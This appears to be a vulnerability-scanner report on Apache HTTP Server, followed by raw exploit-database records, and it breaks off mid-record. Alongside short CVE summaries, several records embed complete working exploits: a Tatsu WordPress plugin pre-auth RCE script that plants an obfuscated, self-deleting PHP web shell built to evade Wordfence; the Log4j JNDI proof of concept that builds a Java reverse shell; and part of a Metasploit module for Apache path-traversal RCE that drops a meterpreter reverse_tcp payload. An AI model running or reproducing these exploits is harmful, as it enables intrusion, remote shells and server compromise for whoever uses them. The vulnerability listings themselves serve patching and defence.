NEXT ITERATION OF VULNERABILITIES ########################################
Vulnerability id: VERACODE:30934 
Type: veracode 
Title: veracode
Score: 7.5
Description: Apache HTTP Server is vulnerable to denial of service. An attacker is able to crash the server via a malicious SessionHeader sent by an origin server.


Vulnerability id: VERACODE:32174 
Type: veracode 
Title: veracode
Score: 6.8
Description: apache2 is vulnerable to cross-site request forgery. An attacker may exploit the vulnerability by sending a crafted request uri-path that can cause mod_proxy to forward the request to an origin server choosen by the remote user. 


Vulnerability id: VERACODE:32175 
Type: veracode 
Title: veracode
Score: 7.5
Description: apache2 is vulnerable to denial of service. ap_escape_quotes() may write beyond the end of a buffer when given malicious input. No included modules pass untrusted data to these functions, but third-party / external modules may.


Vulnerability id: VERACODE:33419 
Type: veracode 
Title: veracode
Score: 7.5
Description: apache2 is has buffer overflow. An attacker is able to cause the vulnerability by sending a crafted request body can cause a buffer overflow in the mod_lua multipart parser (r:parsebody() called from Lua scripts). 


Vulnerability id: VERACODE:34692 
Type: veracode 
Title: veracode
Score: 7.5
Description: Apache HTTP Server 2.4.52 and earlier fails to close inbound connection when errors are encountered discarding the request body, exposing the server to HTTP Request Smuggling


#############################################
#############################################
#############################################
CPE exploits ######################################
None
SW exploits ######################################
None
{'lastseen': '2022-05-20T17:18:36', 'bulletinFamily': 'exploit', 'cvelist': ['CVE-2021-42013'], 'description': '# Apache 2.4.50 - Path Traversal or Remote Code Execution\ncve-20...', 'modified': '2022-05-17T08:54:22', 'published': '2021-10-27T14:29:10', 'id': '52E13088-9643-5E81-B0A0-B7478BCF1F2C', 'href': '', 'type': 'githubexploit', 'title': 'Exploit for Path Traversal in Apache Http Server', 'cvss': {'score': 7.5, 'vector': 'AV:N/AC:L/Au:N/C:P/I:P/A:P'}, 'privateArea': 1, 'vhref': 'https://vulners.com/githubexploit/52E13088-9643-5E81-B0A0-B7478BCF1F2C'}
{'lastseen': '2022-05-18T09:15:44', 'bulletinFamily': 'exploit', 'cvelist': ['CVE-2019-10092'], 'description': '# CVE-2019-10092 Docker - Apache HTTP Server\n\n### Using\n\n```\n$ d...', 'modified': '2022-05-18T08:12:08', 'published': '2019-12-18T14:15:13', 'id': '4013EC74-B3C1-5D95-938A-54197A58586D', 'href': '', 'type': 'githubexploit', 'title': 'Exploit for Cross-site Scripting in Apache Http Server', 'cvss': {'score': 4.3, 'vector': 'AV:N/AC:M/Au:N/C:N/I:P/A:N'}, 'privateArea': 1, 'vhref': 'https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D'}
{'lastseen': '2022-04-29T21:18:30', 'bulletinFamily': 'exploit', 'cvelist': ['CVE-2021-41773'], 'description': 'CVE-2021-41773 Playground\n===\n\nThis is a small Docker recipe for...', 'modified': '2022-04-29T11:12:11', 'published': '2021-10-06T07:17:05', 'id': 'C068A003-5258-51DC-A3C0-786638A1B69C', 'href': '', 'type': 'githubexploit', 'title': 'Exploit for Path Traversal in Apache Http Server', 'cvss': {'score': 4.3, 'vector': 'AV:N/AC:M/Au:N/C:P/I:N/A:N'}, 'privateArea': 1, 'vhref': 'https://vulners.com/githubexploit/C068A003-5258-51DC-A3C0-786638A1B69C'}
{'lastseen': '2022-05-20T05:33:32', 'bulletinFamily': 'exploit', 'cvelist': ['CVE-2021-3449'], 'description': '# CVE-2021-3449 OpenSSL <1.1.1k DoS exploit\n\nUsage: `go run . -h...', 'modified': '2022-05-20T03:49:16', 'published': '2021-03-26T01:09:25', 'id': '050B5540-E4D4-523F-A821-852F4E2CCDD8', 'href': '', 'type': 'githubexploit', 'title': 'Exploit for NULL Pointer Dereference in Openssl', 'cvss': {'score': 4.3, 'vector': 'AV:N/AC:M/Au:N/C:N/I:N/A:P'}, 'privateArea': 1, 'vhref': 'https://vulners.com/githubexploit/050B5540-E4D4-523F-A821-852F4E2CCDD8'}
{'lastseen': '2022-03-12T14:47:39', 'bulletinFamily': 'exploit', 'cvelist': ['CVE-2021-41773'], 'description': '# CVE-2021-41773\nCVE-2021-41773 POC with Docker\n\n### Configurati...', 'modified': '2022-03-12T13:45:57', 'published': '2021-10-06T02:30:40', 'id': '4E4BAF15-6430-514A-8679-5B9F03584B71', 'href': '', 'type': 'githubexploit', 'title': 'Exploit for Path Traversal in Apache Http Server', 'cvss': {'score': 4.3, 'vector': 'AV:N/AC:M/Au:N/C:P/I:N/A:N'}, 'privateArea': 1, 'vhref': 'https://vulners.com/githubexploit/4E4BAF15-6430-514A-8679-5B9F03584B71'}
{'lastseen': '2022-03-12T14:43:28', 'bulletinFamily': 'exploit', 'cvelist': ['CVE-2021-41773'], 'description': '# CVE-2021-41773\nPath traversal in Apache HTTP Server 2.4.49 (CV...', 'modified': '2022-03-12T13:45:22', 'published': '2021-10-05T16:45:41', 'id': '1E6E9010-4BDF-5C30-951C-79C280B90883', 'href': '', 'type': 'githubexploit', 'title': 'Exploit for Path Traversal in Apache Http Server', 'cvss': {'score': 4.3, 'vector': 'AV:N/AC:M/Au:N/C:P/I:N/A:N'}, 'privateArea': 1, 'vhref': 'https://vulners.com/githubexploit/1E6E9010-4BDF-5C30-951C-79C280B90883'}
{'lastseen': '2022-05-05T15:27:36', 'bulletinFamily': 'exploit', 'cvelist': ['CVE-2021-25094'], 'description': 'The plugin add_custom_font action can be used without prior authentication to upload a rogue zip file which is uncompressed under the WordPress\'s upload directory. By adding a PHP shell with a filename starting with a dot ".", this can bypass extension control implemented in the plugin. Moreover, there is a race condition in the zip extraction process which makes the shell file live long enough on the filesystem to be callable by an attacker.\n', 'modified': '2022-04-11T07:50:21', 'published': '2022-03-28T00:00:00', 'id': 'WPEX-ID:FB0097A0-5D7B-4E5B-97DE-AACAFA8FFFCD', 'href': '', 'type': 'wpexploit', 'title': 'Tatsu < 3.3.12 - Unauthenticated RCE', 'sourceData': '#!/usr/bin/python3\r\n# coding: utf-8\r\n\r\n# Tatsudo: Tatsu <= 3.3.8 pre-auth RCE exploit\r\n# The exploit bypass Wordfence\r\n#\r\n# Product: Tatsu wordpress plugin <= 3.3.8\r\n# CVE: CVE-2021-XXX / Vincent MICHEL (@darkpills)\r\n# Editor: Tasubuilder / BrandExponents.com\r\n# URL: https://tatsubuilder.com/\r\n\r\n\r\nimport sys\r\nimport requests\r\nimport argparse\r\nimport urllib3\r\nimport threading\r\nimport time\r\nimport base64\r\nimport queue\r\nimport io\r\nimport os\r\nimport zipfile\r\nimport string\r\nimport random\r\nfrom datetime import datetime\r\n\r\nurllib3.disable_warnings()\r\n\r\nclass HTTPCaller(): \r\n\r\n\tdef __init__(self, url, headers, proxies, cmd):\t\t\r\n\t\tself.url = url\r\n\t\tself.headers = headers\r\n\t\tself.proxies = proxies\r\n\t\tself.cmd = cmd\r\n\t\tself.encodedCmd = base64.b64encode(cmd.encode("utf8"))\r\n\t\tself.zipname = None\r\n\t\tself.shellFilename = None\r\n\r\n\t\tif self.url[-1] == \'/\':\r\n\t\t\tself.url = self.url[:-1]\r\n\r\n\t\tif proxies:\r\n\t\t\tself.proxies = {"http"  : proxies, "https" : proxies}\r\n\t\telse:\r\n\t\t\tself.proxies = {}\r\n\r\n\tdef generateZip(self, compressionLevel, technique, customShell, keep):\r\n\t\tbuffer = io.BytesIO()\r\n\t\twith zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED, False, compressionLevel) as zipFile:\r\n\r\n\t\t\tif technique == "custom" and customShell and os.path.isfile(customShell):\r\n\t\t\t\twith open(customShell) as f:\r\n\t\t\t\t\tshell = f.readlines()\r\n\t\t\t\tshell = "\\n".join(shell)\t\t\t\t\r\n\t\t\t\tself.shellFilename = os.path.basename(customShell)\r\n\t\t\t\tif self.shellFilename[0] != ".":\r\n\t\t\t\t\tself.shellFilename = "." + self.shellFilename\r\n\r\n\t\t\t\tzipFile.writestr(self.shellFilename, shell)\r\n\r\n\t\t\telif technique == "php":\r\n\t\t\t\t# a lazy obfuscated shell, basic bypass Wordfence\r\n\t\t\t\t# i would change base64 encoding for something better\r\n\t\t\t\tshell = "<?php "\r\n\t\t\t\tshell += "$f = \\"lmeyst\\";"\r\n\t\t\t\tshell += "@$a= $f[4].$f[3].$f[4].$f[5].$f[2].$f[1];"\r\n\t\t\t\tshell += "@$words = array(base64_decode($_POST[\'text\']));"\r\n\t\t\t\tshell += "$j=\\"array\\".\\"_\\".\\"filter\\";"\r\n\t\t\t\tshell += "@$filtered_words = $j($words, $a);"\r\n\t\t\t\tif not keep:\r\n\t\t\t\t\tshell += "@unlink(__FILE__);"\r\n\t\t\t\tself.shellFilename = "." + (\'\'.join(random.choice(string.ascii_lowercase) for i in range(5))) + ".php"\r\n\t\t\t\tzipFile.writestr(self.shellFilename, shell)\r\n\r\n\r\n\t\t\telif technique.startswith("htaccess"):\r\n\t\t\t\t\r\n\t\t\t\t# requires AllowOverride All in the apache config file\r\n\t\t\t\tshell = "AddType application/x-httpd-php .png\\n"\r\n\t\t\t\tzipFile.writestr(".htaccess", shell)\t\t\t\t\r\n\r\n\t\t\t\tshell = "<?php "\r\n\t\t\t\tshell += "$f = \\"lmeyst\\";"\r\n\t\t\t\tshell += "@$a= $f[4].$f[3].$f[4].$f[5].$f[2].$f[1];"\r\n\t\t\t\tshell += "@$words = array(base64_decode($_POST[\'text\']));"\r\n\t\t\t\tshell += "$j=\\"array\\".\\"_\\".\\"filter\\";"\r\n\t\t\t\tshell += "@$filtered_words = $j($words, $a);"\r\n\t\t\t\tif not keep:\r\n\t\t\t\t\tshell += "@unlink(\'.\'+\'h\'+\'t\'+\'a\'+\'cc\'+\'e\'+\'ss\');"\r\n\t\t\t\t\tshell += "@unlink(__FILE__);"\r\n\t\t\t\tself.shellFilename = "." + (\'\'.join(random.choice(string.ascii_lowercase) for i in range(5))) + ".png"\r\n\t\t\t\tzipFile.writestr(self.shellFilename, shell)\r\n\r\n\t\t\telse:\r\n\t\t\t\tprint("Error: unknow shell technique %s" % technique)\r\n\t\t\t\tsys.exit(1)\r\n\r\n\t\t\tself.zipname = \'\'.join(random.choice(string.ascii_lowercase) for i in range(3))\t\t\t\r\n\r\n\t\tself.zipFile = buffer\r\n\r\n\tdef getShellUrl(self):\r\n\t\treturn "%s/wp-content/uploads/typehub/custom/%s/%s" % (self.url, self.zipname, self.shellFilename)\r\n\r\n\tdef executeCmd(self):\t\t\r\n\t\treturn requests.post(url = self.getShellUrl(), data = {"text": self.encodedCmd}, headers = self.headers, proxies = self.proxies, verify=False)\r\n\r\n\tdef upload(self):\r\n\t\turl = "%s/wp-admin/admin-ajax.php" % self.url\r\n\t\tfiles = {"file": ("%s.zip" % self.zipname, self.zipFile.getvalue())}\r\n\t\treturn requests.post(url = url, data = {"action": "add_custom_font"}, files = files, headers = self.headers, proxies = self.proxies, verify=False)\r\n\r\ndef main():\r\n\t\r\n\tdescription =  "|=== Tatsudo: pre-auth RCE exploit for Tatsu wordpress plugin <= 3.3.8\\n"\r\n\tdescription += "|=== CVE-2021-XXX / Vincent MICHEL (@darkpills)"\r\n\r\n\tprint(description)\r\n\tprint("")\r\n\r\n\tparser = argparse.ArgumentParser()\r\n\tparser.add_argument("url", help="Wordpress vulnerable URL (example: https://mywordpress.com/)")\r\n\tparser.add_argument("cmd", help="OS command to execute")\r\n\tparser.add_argument(\'--technique\', help="Shell technique: php | htaccess | custom", default="php")\r\n\tparser.add_argument(\'--customShell\', help="Provide a custom PHP shell file that will take a base64 cmd as $_POST[\'text\'] input")\r\n\tparser.add_argument(\'--keep\', help="Do not auto-destruct the uploaded PHP shell", default=False, type=bool)\r\n\tparser.add_argument(\'--proxy\', help="Specify and use an HTTP proxy (example: http://localhost:8080)")\r\n\tparser.add_argument(\'--compressionLevel\', help="Compression level of the zip file (0 to 9, default 9)", default=9, type=int)\r\n\t\r\n\r\n\targs = parser.parse_args()\r\n\t\r\n\t# Use web browser-like header\r\n\theaders = {\r\n\t\t"X-Requested-With": "XMLHttpRequest",\r\n\t\t"Origin": args.url,\r\n\t\t"Referer": args.url,\r\n\t\t"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",\r\n\t\t"Accept": "*/*",\r\n\t\t"Accept-Language": "en-US,en;q=0.9"\r\n\t}\r\n\r\n\tcaller = HTTPCaller(args.url, headers, args.proxy, args.cmd)\r\n\t\r\n\tprint("[+] Generating a zip with shell technique \'%s\'" % args.technique)\r\n\tcaller.generateZip(args.compressionLevel, args.technique, args.customShell, args.keep)\r\n\r\n\tprint("[+] Uploading zip archive to %s/wp-admin/admin-ajax.php?action=add_custom_font" % (args.url))\r\n\tr = caller.upload()\r\n\tif (r.status_code != 200 or not r.text.startswith(\'{"status":"success"\')):\r\n\t\tprint("[!] Got an unexpected HTTP response: %d with content:\\n%s" % (r.status_code, r.text))\r\n\t\tprint("[!] Exploit failed!")\r\n\t\tsys.exit(1)\r\n\r\n\tprint("[+] Upload OK")\r\n\r\n\tprint("[+] Trigger shell at %s" % caller.getShellUrl())\r\n\tr = caller.executeCmd()\r\n\tif (r.status_code != 200):\r\n\t\tprint("[!] Got an unexpected HTTP response: %d with content:\\n%s" % (r.status_code, r.text))\r\n\t\tprint("[!] Exploit failed!")\r\n\t\tsys.exit(1)\r\n\t\r\n\tprint("[+] Exploit success!")\r\n\tprint(r.text)\r\n\r\n\tif args.keep:\r\n\t\tprint("[+] Call it with:")\r\n\t\tprint(\'curl -X POST -d"text=$(echo "{0}" | base64 -w0)" {1}\'.format(args.cmd, caller.getShellUrl()))\r\n\telse:\r\n\t\tprint("[+] Shell file has been auto-deleted but parent directory will remain on the webserver")\r\n\r\n\tprint("[+] Job done")\r\n\r\nif __name__ == \'__main__\':\r\n    main()\r\n', 'cvss': {'score': 6.8, 'vector': 'AV:N/AC:M/Au:N/C:P/I:P/A:P'}, 'vhref': 'https://vulners.com/wpexploit/WPEX-ID:FB0097A0-5D7B-4E5B-97DE-AACAFA8FFFCD'}
{'lastseen': '2022-02-19T20:20:02', 'bulletinFamily': 'exploit', 'cvelist': ['CVE-2021-41773'], 'description': '# CVE-2021-41773\nPath traversal and file disclosure vulnerabilit...', 'modified': '2022-02-19T20:08:58', 'published': '2021-10-05T23:53:48', 'id': '27108E72-8DC1-53B5-97D9-E869CA13EFF7', 'href': '', 'type': 'githubexploit', 'title': 'Exploit for Path Traversal in Apache Http Server', 'cvss': {'score': 4.3, 'vector': 'AV:N/AC:M/Au:N/C:P/I:N/A:N'}, 'privateArea': 1, 'vhref': 'https://vulners.com/githubexploit/27108E72-8DC1-53B5-97D9-E869CA13EFF7'}
{'lastseen': '2022-02-01T00:00:00', 'bulletinFamily': 'exploit', 'cvelist': ['CVE-2021-41773', 'CVE-2021-42013'], 'description': '# apache httpd path traversal checker\n\n\n## 0x00 概述\n\n20211005，网上曝...', 'modified': '2022-01-31T07:15:01', 'published': '2021-10-15T10:38:44', 'id': '1C39E10A-4A38-5228-8334-2A5F8AAB7FC3', 'href': '', 'type': 'githubexploit', 'title': 'Exploit for Path Traversal in Apache Http Server', 'cvss': {'score': 7.5, 'vector': 'AV:N/AC:L/Au:N/C:P/I:P/A:P'}, 'privateArea': 1, 'vhref': 'https://vulners.com/githubexploit/1C39E10A-4A38-5228-8334-2A5F8AAB7FC3'}
{'lastseen': '2022-03-23T14:57:26', 'bulletinFamily': 'exploit', 'cvelist': ['CVE-2021-20038', 'CVE-2021-20039'], 'description': '# Bad Blood\n\nBad Blood is an exploit for [CVE-2021-20038](https:...', 'modified': '2022-02-15T01:59:06', 'published': '2022-01-11T02:25:25', 'id': 'BCE44917-6A5A-5482-8773-B2FA0DE70F3B', 'href': '', 'type': 'githubexploit', 'title': 'Exploit for Out-of-bounds Write in Sonicwall Sma 200 Firmware', 'cvss': {'score': 9.0, 'vector': 'AV:N/AC:L/Au:S/C:C/I:C/A:C'}, 'privateArea': 1, 'vhref': 'https://vulners.com/githubexploit/BCE44917-6A5A-5482-8773-B2FA0DE70F3B'}
{'lastseen': '2022-05-13T17:34:01', 'description': '', 'published': '2021-12-14T00:00:00', 'type': 'exploitdb', 'title': 'Apache Log4j 2 - Remote Code Execution (RCE)', 'bulletinFamily': 'exploit', 'cvelist': ['2021-44228', 'CVE-2021-44228'], 'modified': '2021-12-14T00:00:00', 'id': 'EDB-ID:50592', 'href': 'https://www.exploit-db.com/exploits/50592', 'sourceData': '# Exploit Title: Apache Log4j 2 - Remote Code Execution (RCE)\r\n# Date: 11/12/2021\r\n# Exploit Authors: kozmer, z9fr, svmorris\r\n# Vendor Homepage: https://logging.apache.org/log4j/2.x/\r\n# Software Link: https://github.com/apache/logging-log4j2\r\n# Version: versions 2.0-beta-9 and 2.14.1.\r\n# Tested on: Linux\r\n# CVE: CVE-2021-44228\r\n# Github repo: https://github.com/kozmer/log4j-shell-poc\r\n\r\nimport subprocess\r\nimport sys\r\nimport argparse\r\nfrom colorama import Fore, init\r\nimport subprocess\r\nimport threading\r\n\r\nfrom http.server import HTTPServer, SimpleHTTPRequestHandler\r\n\r\ninit(autoreset=True)\r\n\r\ndef listToString(s):\r\nstr1 = ""\r\ntry:\r\nfor ele in s:\r\nstr1 += ele\r\nreturn str1\r\nexcept Exception as ex:\r\nparser.print_help()\r\nsys.exit()\r\n\r\ndef payload(userip , webport , lport):\r\n\r\ngenExploit = (\r\n"""\r\nimport java.io.IOException;\r\nimport java.io.InputStream;\r\nimport java.io.OutputStream;\r\nimport java.net.Socket;\r\n\r\npublic class Exploit {\r\n\r\npublic Exploit() throws Exception {\r\nString host="%s";\r\nint port=%s;\r\nString cmd="/bin/sh";\r\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\r\nSocket s=new Socket(host,port);\r\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\r\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\r\nwhile(!s.isClosed()) {\r\nwhile(pi.available()>0)\r\nso.write(pi.read());\r\nwhile(pe.available()>0)\r\nso.write(pe.read());\r\nwhile(si.available()>0)\r\npo.write(si.read());\r\nso.flush();\r\npo.flush();\r\nThread.sleep(50);\r\ntry {\r\np.exitValue();\r\nbreak;\r\n}\r\ncatch (Exception e){\r\n}\r\n};\r\np.destroy();\r\ns.close();\r\n}\r\n}\r\n""") % (userip, lport)\r\n\r\n# writing the exploit to Exploit.java file\r\n\r\ntry:\r\nf = open("Exploit.java", "w")\r\nf.write(genExploit)\r\nf.close()\r\nprint(Fore.GREEN + \'[+] Exploit java class created success\')\r\n\r\nexcept Exception as e:\r\nprint(Fore.RED + f\'[-] Something went wrong {e.toString()}\')\r\n\r\ncheckJavaAvailible()\r\nprint(Fore.GREEN + \'[+] Setting up fake LDAP server\\n\')\r\n\r\n# create the LDAP server on new thread\r\nt1 = threading.Thread(target=createLdapServer, args=(userip,webport))\r\nt1.start()\r\n\r\n# start the web server\r\n\r\nhttpd = HTTPServer((\'localhost\', int(webport)), SimpleHTTPRequestHandler)\r\nhttpd.serve_forever()\r\n\r\ndef checkJavaAvailible():\r\njavaver = subprocess.call([\'./jdk1.8.0_20/bin/java\', \'-version\'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)\r\nif(javaver != 0):\r\nprint(Fore.RED + \'[-] Java is not installed inside the repository \')\r\nsys.exit()\r\n\r\ndef createLdapServer(userip, lport):\r\nsendme = ("${jndi:ldap://%s:1389/a}") % (userip)\r\nprint(Fore.GREEN +"[+] Send me: "+sendme+"\\n")\r\n\r\nsubprocess.run(["./jdk1.8.0_20/bin/javac", "Exploit.java"])\r\n\r\nurl = "\r\nhttp://{}:{}/#Exploit".format\r\n(userip, lport)\r\nsubprocess.run(["./jdk1.8.0_20/bin/java", "-cp",\r\n"target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", url])\r\n\r\ndef header():\r\nprint(Fore.BLUE+"""\r\n[!] CVE: CVE-2021-44228\r\n[!] Github repo:\r\nhttps://github.com/kozmer/log4j-shell-poc\r\n""")\r\n\r\nif __name__ == "__main__":\r\nheader()\r\n\r\ntry:\r\nparser = argparse.ArgumentParser(description=\'please enter the values \')\r\n\r\nparser.add_argument(\'--userip\', metavar=\'userip\', type=str,\r\nnargs=\'+\', help=\'Enter IP for LDAPRefServer & Shell\')\r\n\r\nparser.add_argument(\'--webport\', metavar=\'webport\', type=str,\r\nnargs=\'+\', help=\'listener port for HTTP port\')\r\n\r\nparser.add_argument(\'--lport\', metavar=\'lport\', type=str,\r\nnargs=\'+\', help=\'Netcat Port\')\r\n\r\nargs = parser.parse_args()\r\n\r\n#print(args.userip)\r\n\r\npayload(listToString(args.userip), listToString(args.webport), listToString(args.lport))\r\n\r\nexcept KeyboardInterrupt:\r\nprint(Fore.RED + "user interupted the program.")\r\nsys.exit(0)', 'sourceHref': 'https://www.exploit-db.com/download/50592', 'cvss': {'score': 9.3, 'vector': 'AV:N/AC:M/Au:N/C:C/I:C/A:C'}, 'vhref': 'https://vulners.com/exploitdb/EDB-ID:50592'}
{'lastseen': '2022-03-23T17:06:58', 'bulletinFamily': 'exploit', 'cvelist': ['CVE-2020-1967'], 'description': '# CVE-2020-1967\nProof of concept exploit about OpenSSL signature...', 'modified': '2021-12-15T14:39:07', 'published': '2020-04-28T21:15:35', 'id': '9D1AE9EC-AAED-5991-9F41-9458ABC7EFC3', 'href': '', 'type': 'githubexploit', 'title': 'Exploit for NULL Pointer Dereference in Openssl', 'cvss': {'score': 5.0, 'vector': 'AV:N/AC:L/Au:N/C:N/I:N/A:P'}, 'privateArea': 1, 'vhref': 'https://vulners.com/githubexploit/9D1AE9EC-AAED-5991-9F41-9458ABC7EFC3'}
{'lastseen': '2022-02-01T00:00:00', 'bulletinFamily': 'exploit', 'cvelist': ['CVE-2021-41773'], 'description': '# Apache 2.4.49 - Path Traversal or Remote Code Execution\ncve-20...', 'modified': '2021-11-25T09:32:45', 'published': '2021-10-23T12:31:53', 'id': '3CF66144-235E-5F7A-B889-113C11ABF150', 'href': '', 'type': 'githubexploit', 'title': 'Exploit for Path Traversal in Apache Http Server', 'cvss': {'score': 4.3, 'vector': 'AV:N/AC:M/Au:N/C:P/I:N/A:N'}, 'privateArea': 1, 'vhref': 'https://vulners.com/githubexploit/3CF66144-235E-5F7A-B889-113C11ABF150'}
{'lastseen': '2022-02-01T00:00:00', 'bulletinFamily': 'exploit', 'cvelist': ['CVE-2021-41773', 'CVE-2021-42013'], 'description': '# CVE-2021-41773|CVE-2021-42013: Path Traversal Zero-Day in Apac...', 'modified': '2021-11-07T19:19:39', 'published': '2021-10-06T14:58:27', 'id': 'A2D97DCC-04C2-5CB1-921F-709AA8D7FD9A', 'href': '', 'type': 'githubexploit', 'title': 'Exploit for Path Traversal in Apache Http Server', 'cvss': {'score': 7.5, 'vector': 'AV:N/AC:L/Au:N/C:P/I:P/A:P'}, 'privateArea': 1, 'vhref': 'https://vulners.com/githubexploit/A2D97DCC-04C2-5CB1-921F-709AA8D7FD9A'}
{'lastseen': '2022-02-01T00:00:00', 'bulletinFamily': 'exploit', 'cvelist': ['CVE-2021-41773'], 'description': 'CVE-2021-41773 Playground\n===\n\nThis is a small Docker recipe for...', 'modified': '2021-11-01T09:04:40', 'published': '2021-10-07T00:14:40', 'id': '04E3583E-DFED-5D0D-BCF2-1C1230EB666D', 'href': '', 'type': 'githubexploit', 'title': 'Exploit for Path Traversal in Apache Http Server', 'cvss': {'score': 4.3, 'vector': 'AV:N/AC:M/Au:N/C:P/I:N/A:N'}, 'privateArea': 1, 'vhref': 'https://vulners.com/githubexploit/04E3583E-DFED-5D0D-BCF2-1C1230EB666D'}
{'lastseen': '2021-12-23T13:19:11', 'description': 'This Metasploit module exploits an unauthenticated remote code execution vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773). If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled, it can be used to execute arbitrary commands. This vulnerability has been reintroduced in the Apache 2.4.50 fix (CVE-2021-42013).', 'published': '2021-10-26T00:00:00', 'type': 'zdt', 'title': 'Apache 2.4.49 / 2.4.50 Traversal / Remote Code Execution Exploit', 'bulletinFamily': 'exploit', 'cvelist': ['CVE-2021-42013', 'CVE-2021-41773'], 'modified': '2021-10-26T00:00:00', 'id': '1337DAY-ID-36952', 'href': 'https://0day.today/exploit/description/36952', 'sourceData': '##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::CheckModule\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        \'Name\' => \'Apache 2.4.49/2.4.50 Traversal RCE\',\n        \'Description\' => %q{\n          This module exploit an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773).\n          If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled,\n          it can be used to execute arbitrary commands (Remote Command Execution).\n          This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).\n        },\n        \'References\' => [\n          [\'CVE\', \'2021-41773\'],\n          [\'CVE\', \'2021-42013\'],\n          [\'URL\', \'https://httpd.apache.org/security/vulnerabilities_24.html\'],\n          [\'URL\', \'https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse\'],\n          [\'URL\', \'https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml\'],\n          [\'URL\', \'https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74\'],\n          [\'URL\', \'https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis\']\n        ],\n        \'Author\' => [\n          \'Ash Daulton\', # Vulnerability discovery\n          \'Dhiraj Mishra\', # Metasploit auxiliary module\n          \'mekhalleh (RAMELLA Sébastien)\' # Metasploit exploit module (Zeop Entreprise)\n        ],\n        \'DisclosureDate\' => \'2021-05-10\',\n        \'License\' => MSF_LICENSE,\n        \'Platform\' => [\'unix\', \'linux\'],\n        \'Arch\' => [ARCH_CMD, ARCH_X64, ARCH_X86],\n        \'DefaultOptions\' => {\n          \'CheckModule\' => \'auxiliary/scanner/http/apache_normalize_path\',\n          \'Action\' => \'CHECK_RCE\',\n          \'RPORT\' => 443,\n          \'SSL\' => true\n        },\n        \'Targets\' => [\n          [\n            \'Automatic (Dropper)\',\n            {\n              \'Platform\' => \'linux\',\n              \'Arch\' => [ARCH_X64, ARCH_X86],\n              \'Type\' => :linux_dropper,\n              \'DefaultOptions\' => {\n                \'PAYLOAD\' => \'linux/x64/meterpreter/reverse_tcp\',\n                \'DisablePayloadHandler\' => \'false\'\n              }\n            }\n          ],\n          [\n            \'Unix Command (In-Memory)\',\n            {\n              \'Platform\' => \'unix\',\n              \'Arch\' => ARCH_CMD,\n              \'Type\' => :unix_command,\n              \'DefaultOptions\' => {\n                \'PAYLOAD\' => \'cmd/unix/generic\',\n                \'DisablePayloadHandler\' => \'true\'\n              }\n            }\n          ],\n        ],\n        \'DefaultTarget\' => 0,\n        \'Notes\' => {\n          \'Stability\' => [CRASH_SAFE],\n          \'Reliability\' => [REPEATABLE_SESSION],\n          \'SideEffects\' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptEnum.new(\'CVE\', [true, \'The vulnerability to use\', \'CVE-2021-42013\', [\'CVE-2021-41773\', \'CVE-2021-42013\']]),\n      OptInt.new(\'DEPTH\', [true, \'Depth for Path Traversal\', 5]),\n      OptString.new(\'TARGETURI\', [true, \'Base path\', \'/cgi-bin\'])\n    ])\n  end\n\n  def cmd_unix_generic?\n    datastore[\'PAYLOAD\'] == \'cmd/unix/generic\'\n  end\n\n  def execute_command(command, _opts = {})\n    traversal = pick_payload * datastore[\'DEPTH\'] << \'/bin/sh\'\n\n    uri = normalize_uri(datastore[\'TARGETURI\'], traversal.to_s)\n    response = send_request_raw({\n      \'method\' => Rex::Text.rand_text_alpha(3..4),\n      \'uri\' => uri,\n      \'data\' => "#{Rex::Text.rand_text_alpha(1..3)}=|echo;#{command}"\n    })\n    if response && response.body\n      return response.body\n    end\n\n    false\n  end\n\n  def message(msg)\n    "#{@proto}://#{datastore[\'RHOST\']}:#{datastore[\'RPORT\']} - #{msg}"\n  end\n\n  def pick_payload\n    case datastore[\'CVE\']\n    when \'CVE-2021-41773\'\n      payload = \'.%2e/\'\n    when \'CVE-2021-42013\'\n      payload = \'.%%32%65/\'\n    else\n      payload = \'\'\n    end\n\n    payload\n  end\n\n  def exploit\n    @proto = (ssl ? \'https\' : \'http\')\n\n    if (!check.eql? Exploit::CheckCode::Vulnerable) && !datastore[\'ForceExploit\']\n      fail_with(Failure::NotVulnerable, \'The target is not exploitable.\')\n    end\n\n    print_status(message("Attempt to exploit for #{datastore[\'CVE\']}"))\n    case target[\'Type\']\n    when :linux_dropper\n\n      file_name = "/tmp/#{Rex::Text.rand_text_alpha(4..8)}"\n      cmd = "echo #{Rex::Text.encode_base64(generate_payload_exe)} | base64 -d > #{file_name}; chmod +x #{file_name}; #{file_name}; rm -f #{file_name}"\n\n      print_status(message("Sending #{datastore[\'PAYLOAD\']} command payload"))\n      vprint_status(message("Generated command payload: #{cmd}"))\n\n      execute_command(cmd)\n\n      register_file_for_cleanup file_name\n    when :unix_command\n      vprint_status(message("Generated payload: #{payload.encoded}"))\n\n      if !cmd_unix_generic?\n        execute_command(payload.encoded)\n      else\n        received = execute_command(payload.encoded.to_s)\n\n        print_warning(message(\'Dumping command output in response\'))\n        if !received\n          print_error(message(\'Empty 